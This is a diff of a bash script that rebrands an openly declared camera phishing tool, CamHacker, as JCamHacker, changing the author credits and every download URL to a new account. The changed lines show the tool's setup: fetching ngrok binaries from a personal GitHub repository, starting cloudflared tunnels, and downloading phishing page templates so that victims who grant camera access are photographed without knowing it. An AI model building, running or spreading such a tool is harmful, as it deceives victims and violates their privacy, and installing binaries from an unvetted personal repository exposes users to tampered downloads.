@@ -1,13 +1,13 @@
 #!/bin/bash
 
-# CamHacker
+# JCamHacker
 # Version    : 1.1
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
+# Description: JCamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : alvinbaby
+# Github     : https://github.com/alvinbaby
+# Email      : alvinbaby@gmail.com
 # Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
+# Date       : 21-12-2021
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -105,7 +105,7 @@ ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v1.1]
-${blue}                                    [By KasRoudra]
+${blue}                                    [By alvinbaby]
 "
 
 killer() {
@@ -260,14 +260,14 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
         cd "$cwd"
         if echo "$d" | grep -q "Darwin"; then
             if echo "$p" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                 tar -zxf cloudflared.tgz > /dev/null 2>&1
                 rm -rf cloudflared.tgz
                 break
             elif echo "$p" | grep -q "arm64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                 ngrokdel
                 echo -e "${error}Cloudflared not available for device architecture!"
                 sleep 3
@@ -282,23 +282,23 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
                 if [ -e ngrok-stable-linux-arm64.tgz ];then
                    rm -rf ngrok-stable-linux-arm64.tgz
                 fi
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
+                wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                 tar -zxf ngrok.tgz
                 rm -rf ngrok.tgz
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                 break
             elif echo "$p" | grep -q "arm"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                 break
             elif echo "$p" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                 break
             else
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                 break
@@ -321,18 +321,18 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     fi
 fi
 netcheck
-git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
+git_ver=`curl -s -N https://raw.githubusercontent.com/alvinbaby/JCamHacker/main/files/version.txt`
 if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
+    changelog=`curl -s -N https://raw.githubusercontent.com/alvinbaby/JCamHacker/main/files/changelog.log`
     clear
     echo -e "$logo"
-    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
+    echo -e "${info}JCamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update JCamHacker?${yellow}[y/n] > $green"
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
-            echo -e "\n${success}CamHacker updated successfully!!"
+            cd .. && rm -rf JCamHacker JCamHacker && git clone https://github.com/alvinbaby/JCamHacker
+            echo -e "\n${success}JCamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
             echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
             fi
@@ -400,17 +400,17 @@ read option
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
+        echo -e "$red[ToolName]  ${cyan}  :[JCamHacker]
 $red[Version]    ${cyan} :[1.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[alvinbaby]
+$red[Github]     ${cyan} :[https://github.com/alvinbaby] 
+$red[Messenger]  ${cyan} :[https://m.me/alvinbaby]
+$red[Email]      ${cyan} :[alvinbabykrd@gmail.com]"
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/alvinbaby/alvinbaby#My-Best-Works"
     elif echo $option | grep -q "0"; then
         exit 0
     else
@@ -427,7 +427,7 @@ if ! [ -d $dir ];then
 mkdir $dir
 cd $dir
 netcheck
-wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
+wget -q --show-progress "https://github.com/alvinbaby/files/raw/main/${dir}.zip"
 unzip ${dir}.zip > /dev/null 2>&1
 rm -rf ${dir}.zip
 else
